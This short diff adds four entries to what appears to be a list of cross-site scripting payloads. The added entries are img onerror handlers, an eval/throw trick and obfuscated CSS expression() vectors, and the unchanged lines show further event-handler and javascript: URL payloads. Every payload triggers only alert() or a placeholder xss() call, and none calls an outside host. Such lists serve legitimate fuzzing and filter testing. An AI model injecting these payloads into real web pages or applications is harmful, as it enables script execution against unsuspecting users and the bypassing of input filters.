@@ -1,3 +1,7 @@
+<img src=x onerror=alert;throw 1;>
+<img src=x onerror=eval;throw'=alert\x281\x29';>
+<%tag style="xss:expression(alert(6))">
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(1))>
 <IMG alt=``onload=xss() src=x>
 <div style="background:url('javascript:alert(1)')">
 <sopas style=font-size:200px onmouseover=alert(1)>
